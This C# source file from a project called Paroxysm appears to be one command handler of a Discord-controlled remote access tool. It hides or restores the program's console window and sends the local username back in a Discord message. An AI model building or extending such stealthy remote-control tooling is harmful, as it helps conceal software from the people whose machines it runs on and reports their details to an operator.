using Discord;
using Paroxysm.Tools;

namespace Paroxysm.Hooks.Actions;

public static class ConsoleAction
{
    public static Embed Follow()
    {
        Settings.ConsoleClosed = !Settings.ConsoleClosed;
        var handle = HookStatement.GetConsoleWindow();
        HookStatement.ShowWindow(handle, Settings.ConsoleClosed ? HookStatement.SW_HIDE : HookStatement.SW_RESTORE);

        return EmbedCreator.CreateWithText(Color.Green, "Command was executed successfully",
            "Console action has been triggered", Environment.UserName, null);
    }
}